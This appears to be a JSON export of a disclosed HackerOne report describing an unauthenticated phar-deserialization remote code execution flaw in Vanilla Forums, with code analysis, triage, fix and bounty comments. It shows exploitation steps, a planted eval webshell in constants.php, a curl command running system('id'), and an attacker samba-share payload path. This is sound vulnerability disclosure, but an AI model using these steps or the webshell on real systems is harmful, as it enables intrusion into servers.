@@ -1,0 +1,466 @@
+{
+  "id": 410882,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTA4ODI=",
+  "url": "https://hackerone.com/reports/410882",
+  "title": "Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-17T23:05:19.946Z",
+  "submitted_at": "2018-09-17T23:05:19.946Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mr_me",
+    "url": "/mr_me",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17443,
+    "url": "https://hackerone.com/vanilla",
+    "handle": "vanilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vanilla",
+      "twitter_handle": "vanilla",
+      "website": "http://vanillaforums.com",
+      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-11-23T15:46:58.101Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-24T15:46:51.607Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nAn **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.\n\n## Notes:\n\n- **THIS BUG IS UNAUTHENTICATED**, however you need to have an admin account to run this poc because we leverage the file upload to get our phar file on the target.\n- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\n- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\n- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Windows, you could use a samba share. I have tested this and its proved to be working 100%.\n  The payload would look like phar:////attacker-share/share/poc.jpg and can be reached unauthenticated.\n- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\n\n## Analysis:\n\nInside of the library/core/functions.general.php file we can see the following code:\n\n```\nclass ImportController extends DashboardController {\n\n    ...\n\n    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {\n        $pageInfo = [\n            'Url' => $url,\n            'Title' => '',\n            'Description' => '',\n            'Images' => [],\n            'Exception' => false\n        ];\n\n        try {\n            // Make sure the URL is valid.\n            $urlParts = parse_url($url);\n            if ($urlParts === false || !in_array(val('scheme', $urlParts), ['http', 'https'])) {\n                throw new Exception('Invalid URL.', 400);\n            }\n\n            $request = new ProxyRequest();\n            $pageHtml = $request->request([\n                'URL' => $url,\n                'Timeout' => $timeout,\n                'Cookies' => $sendCookies,\n                'Redirects' => true,\n            ]);                                                                         // 1\n\n            if (!$request->status()) {\n                throw new Exception('Couldn\\'t connect to host.', 400);\n            }\n\n\n            ...\n\n            // Page Images\n            if (count($pageInfo['Images']) == 0) {\n                $images = domGetImages($dom, $url);                                     // 2\n                $pageInfo['Images'] = array_values($images);\n            }\n```\n\nAt [1] we can reach a HTTP SSRF with an attacker controlled `$url`. Note also that there is no authentication here. Then at [2] we can reach the `domGetImages()` function with our `$url` and `$dom` which is the response from the attackers web server.\n\nContinuing inside of the library/core/functions.general.php file we can see the following code:\n\n```\n    function domGetImages($dom, $url, $maxImages = 4) {\n        $images = [];\n        foreach ($dom->query('img') as $element) {                                      // 3\n            $images[] = [\n                'Src' => absoluteSource($element->attr('src'), $url),                   // 4\n                'Width' => $element->attr('width'),\n                'Height' => $element->attr('height'),\n            ];\n        }\n\n        // Sort by size, biggest one first\n        $imageSort = [];\n        // Only look at first 4 images (speed!)\n        $i = 0;\n        foreach ($images as $imageInfo) {\n            $image = $imageInfo['Src'];                                                 // 5\n\n            if (strpos($image, 'doubleclick.') != false) {\n                continue;\n            }\n\n            try {\n                if ($imageInfo['Height'] && $imageInfo['Width']) {\n                    $height = $imageInfo['Height'];\n                    $width = $imageInfo['Width'];\n                } else {\n                    list($width, $height) = getimagesize($image);                       // 6\n                }\n```\n\nAt [3] the code looks for a img tag and at [4] it will set the `$images` array with the attackers controlled src attribute. Then at [5] the code sets the `$image` variable with the attackers controlled src. Finally at [6] we can reach the `getimagesize()` with an arbitrary string. \n\n## Exploitation:\n\nIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums. \nThe payload would look like phar:////attacker-share/share/poc.phar/.jpg and could be reached unauthenticated.\n\n## Example:\n\nThe following steps are used to re-create the vulnerability:\n\n1. We create our phar file:\n\n`saturn:~ mr_me$ php poc-stage-1.php`\n\n2. We run the poc-stage-2.py which will trigger the bug\n\n```\nsaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123 172.16.175.1\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name 6O51ZT69P0S4.jpg!\n(+) starting http server...\n(!) triggered callback for phar!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the victim box:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n<?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n```\n\n## References:\n\n- https://rdot.org/forum/showthread.php?t=4379\n\n## Impact\n\nAn unauthenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.",
+  "bounty_amount": "600.0",
+  "formatted_bounty": "$600",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 347520,
+      "file_name": "vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/347/520/89a8e73e0a1e58ae204f98e45793f15f28cfbd7b/vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip?response-content-disposition=attachment%3B%20filename%3D%22vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip%22%3B%20filename%2A%3DUTF-8%27%27vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074705Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cdccd886952cd1b39d90ac582879a759032e57d9ac607ed1e9d64defaf0e0145",
+      "file_size": 150759,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-23T15:46:51.645Z",
+  "allow_singular_disclosure_after": -152467213.9532751,
+  "singular_disclosure_allowed": true,
+  "vote_count": 32,
+  "voters": [
+    "irek",
+    "fqdn",
+    "inhibitor181",
+    "sameerphad72",
+    "spam404",
+    "ali",
+    "ahiezer",
+    "theappsec",
+    "harry_mg",
+    "eveeez",
+    "and 22 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2101,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.vanillaforums.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 3351373,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Also, please note that the poc-stage-2.py will need to listen on port 9090 and the `victim` Vanilla Forums target will need to be allowed to make an out bound connection to your attacker's machine.",
+      "automated_response": false,
+      "created_at": "2018-09-17T23:17:10.849Z",
+      "updated_at": "2018-09-17T23:17:10.849Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3351648,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I forgot to mention, that the entry into the controller is in applications/dashboard/controllers/class.utilitycontroller.php:\n\n```\nclass UtilityController extends DashboardController {\n\n    ...\n\n    public function fetchPageInfo($url = '') {\n        $pageInfo = fetchPageInfo($url);                                     // 0\n\n        if (!empty($pageInfo['Exception'])) {\n            throw new Gdn_UserException($pageInfo['Exception'], 400);\n        }\n```\n\nAt [0] we call fetchPageInfo in library/core/functions.general.php.",
+      "automated_response": false,
+      "created_at": "2018-09-18T02:09:21.215Z",
+      "updated_at": "2018-09-18T02:09:21.215Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3353405,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi there. We have received your report, a feedback will be posted shortly.\nThank you.",
+      "automated_response": false,
+      "created_at": "2018-09-18T13:04:15.499Z",
+      "updated_at": "2018-09-18T13:04:15.499Z",
+      "actor": {
+        "username": "dexterr",
+        "cleared": false,
+        "verified": false,
+        "url": "/dexterr",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3362751,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-09-20T13:41:50.480Z",
+      "updated_at": "2018-09-20T13:41:50.480Z",
+      "actor": {
+        "username": "manwithnoname",
+        "cleared": false,
+        "verified": false,
+        "url": "/manwithnoname",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3376858,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.",
+      "automated_response": false,
+      "created_at": "2018-09-23T23:39:18.905Z",
+      "updated_at": "2018-09-23T23:39:18.905Z",
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "mr_me",
+        "url": "/mr_me"
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3376867,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Nice @linc, can I please grab a bounty for this one?",
+      "automated_response": false,
+      "created_at": "2018-09-23T23:44:45.017Z",
+      "updated_at": "2018-09-23T23:44:45.017Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3377181,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Yup, expect it by end of Tuesday at the latest. I need to wait til the accountant is in the office. :o)",
+      "automated_response": false,
+      "created_at": "2018-09-24T03:53:53.023Z",
+      "updated_at": "2018-09-24T03:53:53.023Z",
+      "actor": {
+        "username": "linc",
+        "cleared": false,
+        "verified": false,
+        "url": "/linc",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3379299,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-09-24T12:45:32.904Z",
+      "updated_at": "2018-09-24T12:45:32.904Z",
+      "actor": {
+        "url": "/vanilla",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Vanilla"
+        }
+      },
+      "bounty_amount": "600.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "vanilla",
+      "collaborator": {
+        "username": "mr_me",
+        "url": "/mr_me"
+      }
+    },
+    {
+      "id": 3379415,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks @linc !",
+      "automated_response": false,
+      "created_at": "2018-09-24T13:11:02.951Z",
+      "updated_at": "2018-09-24T13:11:02.951Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3527257,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-10-24T15:46:51.629Z",
+      "updated_at": "2018-10-24T15:46:51.629Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3701313,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-11-23T15:46:58.122Z",
+      "updated_at": "2018-11-23T15:46:58.122Z",
+      "actor": {
+        "url": "/vanilla",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Vanilla"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    },
+    {
+      "id": 3701345,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "CVE-2018-18903",
+      "automated_response": false,
+      "created_at": "2018-11-23T16:01:34.021Z",
+      "updated_at": "2018-11-23T16:01:34.021Z",
+      "actor": {
+        "username": "mr_me",
+        "cleared": false,
+        "verified": false,
+        "url": "/mr_me",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "vanilla"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 10567,
+      "category": "researcher",
+      "content": "An **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.",
+      "user": {
+        "id": 41443,
+        "username": "mr_me",
+        "name": "Steven Seeley",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://srcincite.io/",
+        "location": "",
+        "created_at": "2015-10-08T18:38:12.546Z",
+        "url": "https://hackerone.com/mr_me",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    }
+  ]
+}
